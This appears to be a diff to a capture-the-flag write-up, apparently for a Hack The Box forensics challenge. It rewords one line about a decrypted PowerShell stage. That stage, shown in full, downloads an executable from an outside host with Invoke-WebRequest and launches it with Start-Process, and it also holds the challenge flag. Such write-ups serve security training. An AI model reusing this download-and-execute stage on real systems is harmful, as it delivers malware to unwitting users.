@@ -122,7 +122,7 @@ $DecryptedString = $enc.GetString($DecryptedBytes)
 Write-Output $DecryptedString
 ```
 
-This yields the flag:
+This yields the payload, and also the flag :)
 
 ```
 $path ="C:\ProgramData\windows\goldenf.exe";$exists = Test-Path -Path $path -PathType Leaf;if ( $exists ){Start-Process $path}else{mkdir "C:\ProgramData\windows";Invoke-WebRequest -Uri https://thoccarthmercenaries.edu.tho/wp-content/goldenf.exe -OutFile $path;$flag="HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}";Start-Process $path}
